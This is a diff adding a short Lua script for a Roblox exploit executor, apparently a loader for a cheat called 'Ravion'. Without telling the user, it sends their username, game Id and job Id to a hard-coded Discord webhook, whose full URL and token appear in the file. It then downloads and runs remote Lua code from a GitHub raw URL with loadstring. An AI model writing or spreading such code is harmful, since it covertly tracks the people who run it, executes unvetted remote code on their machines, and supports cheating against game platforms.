@@ -1,0 +1,15 @@
+local Webhook = "https://discord.com/api/webhooks/937816295875960842/CWyWKQC8bMaDN_6DsE4DMXXn2d2cRejfto81hK6eap-IxCy4VdUTKbnnMTGo49wyUh3d"
+local Message = "Someone has executed Ravion! Here are there information, Username: " .. game.Players.LocalPlayer.Name.. ", ".. "Game Id: " ..game.PlaceId.. " Job Id: ".. game.JobId
+
+local HttpService = game.GetService(game, "HttpService");
+local JSONEncode = HttpService.JSONEncode;
+
+local request_method = ((syn and syn.request) or (http and http_request) or request);
+local log_data = {
+    Url = Webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = JSONEncode(HttpService, {content = Message}),
+}; request_method(log_data);
+wait(0.5)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/infinitylua/Luascripts/main/KJFsdEj8sXrja.lua"))()
